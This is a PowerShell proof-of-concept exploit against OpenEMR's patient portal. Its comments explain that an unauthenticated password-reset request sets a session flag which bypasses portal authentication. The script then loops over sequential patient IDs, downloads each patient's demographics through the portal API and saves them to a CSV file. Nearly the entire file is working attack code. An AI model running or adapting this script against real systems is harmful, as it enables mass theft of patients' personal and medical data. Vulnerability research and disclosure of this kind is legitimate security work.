#################################################################################################################
#  Author: Chris Patterson                                                                                      #
#  Date: 2022-01-01                                                                                             #
#  Purpose: Download all patient demographics and place them in a CSV file by making one API call per patient.  #
#  CVE ID:                                                                                                      #
#                                                                                                               #
#################################################################################################################


#Set proxy if needed (Fiddler uses http://localhost:8888)
$proxy = $null #"http://localhost:8888"

#Store the start time of the script to provide running time at the end of the script
$startTime = Get-Date

#Initialize a counter for the number of requests to the server for reporting
$requestCount = 0

#Initialize a counter for the number of requests that fail for reporting
$failCount = 0

#Obtain the maximum fail count from the user.
#There will be gaps in patient IDs from deleted patients. This value is used to
#let the user identify how many failures they are willing to have before a script termination
$maxSuccessiveFailCount = Read-Host "Maximum Successive Failures before exiting"

#Initialize a counter for the number of successive failures, reset it after each success
$successiveFailCount = 0

#Initialize a counter of the number of patient records exported for reporting
$patientRecordCount = 0


#Get the server fqdn if it was not already provided in the PowerShell session
if (!$fqdn) {
    $fqdn = Read-Host -Prompt "Enter the fqdn of the OpenEMR Instance (https://demo.openemr.io/openemr)"
}

#If script was previously run in this session this logic will allow resumption from that point or starting over
if ($patientId) {
    if ((Read-Host "Restart from 0? y/n") -eq "y") {
        $patientId = 0
    }
}

#Start a session by requesting a password reset without logging in
#This activates the error handling logic in index.php which sets $_SESSION['register']=true
#when register session variable is true, authentication is bypassed for the patient portal API
#resulting session data will be stored in teh $session variable
$null = Invoke-WebRequest -URI "$fqdn/portal/index.php?requestNew=true" -SessionVariable 'session' -Proxy $proxy

#Increment the request counter
$requestCount++

#Alternatively, if the self-registration function is enabled, we can start that session to achieve
#the same result of a register session variable set to true.
#$null = Invoke-WebRequest -URI "$fqdn/portal/account/register.php" -SessionVariable 'session'

#Exit the script if unable to establish a session
if (!$session) {
    Write-Host "A session could not be established.  Check the connection settings."
    exit
}

#At this point, we can make a valid patient portal API call
#Use the obtained session to get the next available patient ID. This will give us an estimate of the number of patients available
$response = Invoke-WebRequest -URI "$fqdn/portal/account/account.php?action=get_newpid" -WebSession $Session -Proxy $proxy

#Increment the request counter
$requestCount++

#Store the next available patient ID
$MaxPatientID = $response.Content

#Allow the user to specify a limited set of records, or all available records
$maxPatientRecordCount = Read-Host "Maximum Patient Records to retrieve, approximately $($MaxPatientId - 1) records available (blank for all)"

#Set the export file name
$csvFileName = Read-Host "CSV File Name (will be placed in current working directory)"

Write-Host ""

#While loop to iterate through patient IDs
#Stop if lookup fails the specified number of times in a row or we have reached the next available patient ID
while ($successiveFailCount -lt $maxSuccessiveFailCount -and (!$maxPatientRecordCount -or $patientRecordCount -lt $maxPatientRecordCount)) {
    try {
        #[GET]api/patient/(:num) --Download a Patient Record in json format (format at end of script)
        $response = Invoke-WebRequest -URI "$fqdn/portal/patient/api/patient/$patientId" -Method 'Get' -WebSession $session -Proxy $proxy

	  #Call was successful, so reset successive Failure Count
        $successiveFailCount = 0
        
        #Write Patient Record to CSV
        Export-Csv -InputObject (ConvertFrom-Json $response.Content) -Append -Path $csvFileName -UseQuotes Always -Force -Delimiter ","
        
	  #Increment the patient count
        $patientRecordCount++
        
    } catch {
	  #Increment the overall failure count for reporting
        $failCount++
	  #Increment the successive failure count for loop checks
        $successiveFailCount++
    } finally {
	  #Increment the request count on success or failure
        $requestCount++

	  #Move to the next patient ID
        $patientId++
	
	  #Update status bar
        Write-Host "`rSuccesses: $patientRecordCount `t`tSuccessive Failures: $successiveFailCount `t`tTotal Failures: $failCount `t`tCurrent Patient: $patientId" -NoNewline
    }
}

#Script complete, display report
Write-Host ""
Write-Host "Time Elapsed $(((Get-Date)-$startTime)), $requestCount requests were made, $failCount failures, $patientRecordCount sucessess"
Write-Host ""

<#
Expected sample return from #[GET]api/patient/(:num)
{
  "validationErrors": [],
  "error_description": [],
  "data": {
    "id": "193",
    "pid": "1",
    "pubpid": "",
    "title": "Mr",
    "fname": "Baz",
    "mname": "",
    "lname": "Bop",
    "ss": "",
    "street": "456 Tree Lane",
    "postal_code": "08642",
    "city": "FooTown",
    "state": "FL",
    "county": "",
    "country_code": "US",
    "drivers_license": "",
    "contact_relationship": "",
    "phone_contact": "123-456-7890",
    "phone_home": "",
    "phone_biz": "",
    "phone_cell": "",
    "email": "",
    "DOB": "1992-02-03",
    "sex": "Male",
    "race": "",
    "ethnicity": "",
    "status": ""
  }
}
#>